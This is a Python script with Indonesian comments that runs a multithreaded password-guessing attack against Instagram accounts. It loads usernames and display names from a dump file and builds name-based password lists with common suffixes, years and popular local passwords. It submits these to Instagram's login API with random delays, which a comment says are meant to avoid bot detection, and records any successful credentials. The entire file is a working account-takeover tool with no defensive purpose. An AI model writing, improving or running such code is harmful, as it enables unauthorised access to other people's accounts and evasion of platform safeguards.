import requests
import uuid
import hashlib
import threading
import queue
import random
import time

# Lock untuk mencegah race condition saat menulis ke file
file_lock = threading.Lock()

# Fungsi untuk mendapatkan device_id unik berdasarkan perangkat
def get_device_id():
    unique_string = str(uuid.getnode())  # Menggunakan MAC Address perangkat
    hashed_device_id = hashlib.md5(unique_string.encode()).hexdigest()[:16]  # Menghasilkan 16 karakter ID
    return f"android-{hashed_device_id}"

# Baca akun dari file
def load_accounts(filename="dump.txt"):
    accounts = []
    with open(filename, "r") as f:
        for line in f:
            parts = line.strip().split("|")
            if len(parts) == 2:  # Pastikan format yang benar (username|name)
                accounts.append((parts[0], parts[1]))
    return accounts
def Password(name):
    xxzx = []
    full = name.replace('_', ' ').replace('.', ' ').replace('@', ' ')
    for nama in full.split(' '):
        if len(nama) < 3:
            continue
        base_nama = nama.replace(' ', '')
        common_suffixes = [
            '', '01', '02', '03', '04', '05', '06', '07', '08', '09', '10',
            '12', '123', '1234', '12345', '123456', '007', '111', '222', '333',
            '666', '777', '888', '999', '112233', '123321', '987654', '2024', '2025'
        ]
        for i in range(13, 100):  
            common_suffixes.append(str(i))
        for i in range(1990, 2026):  
            common_suffixes.append(str(i))
        xxzx.extend([base_nama + suffix for suffix in common_suffixes])
        special_suffixes = ['!', '@', '#', '$', '_', '-', '*']
        for suffix in special_suffixes:
            xxzx.append(base_nama + suffix)
        xxzx.append(base_nama.capitalize())  # Nama
        xxzx.append(base_nama.upper())       # NAMA
        xxzx.append(base_nama.lower())       # nama
        for suffix in common_suffixes:
            for special in special_suffixes:
                xxzx.append(base_nama + suffix + special)
    xxzx.extend([
        'sayang', 'sayangku', 'sayang123', 'bismillah', 'alhamdulillah', 'indonesia',
        'password123', 'iloveyou', 'qwerty', 'qwerty123', 'welcome', '12345678', 'abcd1234',
        'admin', 'admin123', 'test123', 'kamu nanya', 'sayangku123', 'Bengkulu'
    ])
    return xxzx


# Fungsi untuk login ke Instagram
def login_instagram(username, password):
    url = "https://www.instagram.com/api/v1/accounts/login/"
    headers = {
        "User-Agent": "Instagram 123.0.0.21.114 Android",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    device_id = get_device_id()
    data = {
        "username": username,
        "password": password,
        "device_id": device_id,
    }
    session = requests.Session()
    response = session.post(url, headers=headers, data=data)
    
    if response.status_code == 200:
        if "logged_in_user" in response.text:
            return "OK"
        elif "challenge_required" in response.text:
            return "CHALLENGE"
    return "FAILED"

# Fungsi untuk menyimpan login sukses
def save_success(username, password):
    with file_lock:
        with open("success.txt", "a") as f:
            f.write(f"{username}|{password}\n")

# Fungsi worker untuk threading
def worker(q):
    while not q.empty():
        try:
            username, password = q.get()
            print(f"Login: {username} | Password: {password}")
            result = login_instagram(username, password)
            
            if result == "OK":
                print(f"{username}: Login berhasil!")
                save_success(username, password)  # Simpan ke file jika login sukses
                q.queue.clear()  # Hentikan semua percobaan lain
                return
            elif result == "CHALLENGE":
                print(f"{username}: Checkpoint terdeteksi, gagal login.")
                q.task_done()
                break  # Berhenti mencoba password lain jika ada checkpoint
            else:
                print(f"{username}: Login gagal dengan password {password}.")
            
            time.sleep(random.uniform(1, 3))  # Random delay untuk menghindari deteksi bot
            q.task_done()
        except Exception as e:
            print(f"Error: {e}")
            q.task_done()

# Looping login akun dari file secara multithreading
def main():
    accounts = load_accounts()
    q = queue.Queue()
    
    for username, name in accounts:
        passwords = Password(name)
        for password in passwords:
            q.put((username, password))
    
    threads = []
    for _ in range(5):  # Gunakan 5 thread untuk mempercepat proses
        t = threading.Thread(target=worker, args=(q,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
if __name__ == "__main__":
    main()
